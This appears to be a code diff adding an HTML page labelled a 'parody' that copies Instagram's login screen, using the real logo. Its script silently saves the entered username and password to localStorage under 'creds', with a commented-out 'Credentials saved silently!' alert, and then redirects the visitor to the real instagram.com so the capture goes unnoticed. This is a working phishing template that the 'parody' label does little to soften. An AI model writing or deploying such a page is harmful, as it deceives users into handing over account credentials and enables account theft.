@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Insta-Blooper • Parody Login</title>
+<link rel="stylesheet" href="./css/index.css">
+</head>
+<body>
+  <div class="container">
+    <div class="phone"></div>
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" />
+      <input type="text" id="user" placeholder="Phone number, username, or email" />
+      <input type="password" id="pass" placeholder="Password" />
+      <button id="loginBtn">Log in</button>
+      <div class="divider"><span>OR</span></div>
+      <button style="background:#0095f6;">Create new Account</button>
+      <div class="footer">Forgot password?</div>
+    </div>
+  </div>
+
+
+<script>
+document.getElementById('loginBtn').addEventListener('click', () => {
+  const user = document.getElementById('user').value || '';
+  const pass = document.getElementById('pass').value || '';
+  
+  if (!user && !pass) return;
+
+  // Save to localStorage (persistent)
+  localStorage.setItem('creds', JSON.stringify({ user, pass }));
+  
+//   alert('Credentials saved silently!');
+  window.location.href = 'https://www.instagram.com/';
+  // Optional: clear input fields
+  document.getElementById('user').value = '';
+  document.getElementById('pass').value = '';
+});
+</script>
+
+</body>
+</html>
